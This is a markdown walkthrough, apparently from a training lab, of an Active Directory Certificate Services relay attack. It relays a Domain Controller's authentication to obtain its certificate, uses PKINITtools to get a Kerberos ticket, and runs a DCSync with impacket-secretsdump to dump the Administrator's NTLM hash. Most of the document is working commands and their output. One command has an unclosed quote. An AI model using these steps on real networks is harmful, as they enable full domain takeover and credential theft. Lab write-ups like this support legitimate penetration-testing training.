This attack abuses **Active Directory Certificate Services (AD CS)** to obtain a certificate for a privileged account (in this case, the Domain Controller machine account).  
The certificate is then used to perform **PKINIT authentication** to obtain a Kerberos TGT, enabling **Pass-the-Ticket** attacks such as **DCSync**.

---

## Step 1: Relaying Authentication to AD CS and Obtaining a Certificate

Using Impacket in relay mode, authentication is relayed to the AD CS HTTP endpoint to request a certificate for the Domain Controller machine account.

Example output indicates success:

```
Authenticating against http://10.129.234.110 as DOMAIN/DC01$ SUCCEED
GOT CERTIFICATE! ID 8
Writing PKCS#12 certificate to ./DC01$.pfx
```

Result:

- A PKCS#12 certificate (`DC01$.pfx`) is generated
    
- The certificate belongs to `DC01$` (Domain Controller machine account)
    

---

## Step 2: Preparing PKINITtools

Clone and set up the PKINITtools repository:

```bash
git clone https://github.com/dirkjanm/PKINITtools.git
cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
```

If you encounter the error:

```
Error detecting the version of libcrypto
```

Fix it by installing `oscrypto` manually:

```bash
pip3 install -I git+https://github.com/wbond/oscrypto.git
```

---

## Step 3: Pass-the-Certificate to Obtain a TGT (PKINIT)

Use the certificate to request a Kerberos TGT via PKINIT.

Command:

```bash
python3 gettgtpkinit.py \
  -cert-pfx ../krbrelayx/DC01$.pfx -pfs-pass '<pass> \
  -dc-ip 10.129.234.109 \
  domain.local/dc01$ \
  /tmp/dc.ccache
```

Successful output includes:

```
Requesting TGT
AS-REP encryption key:
3a1d192a28a4e70e02ae4f1d57bad4adbc7c0b3e7dceb59dab90b8a54f39d616
Saved TGT to file
```

Result:

- A valid Kerberos TGT is stored in `/tmp/dc.ccache`
    

---

## Step 4: Pass-the-Ticket Using the Obtained TGT

Export the Kerberos cache:

```bash
export KRB5CCNAME=/tmp/dc.ccache
```

From this point onward, all Kerberos-aware tools will authenticate as `DC01$`.

---

## Step 5: DCSync as the Domain Controller

As the Domain Controller machine account, perform a DCSync attack to retrieve domain credentials.

Example: Dump the NTLM hash of the Administrator account.

```bash
impacket-secretsdump \
  -k \
  -no-pass \
  -dc-ip 10.129.234.109 \
  -just-dc-user Administrator \
  'DOMAIN.LOCAL/DC01$'@DC01.DOMAIN.LOCAL
```

Successful output:

```
Dumping Domain Credentials
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::
```
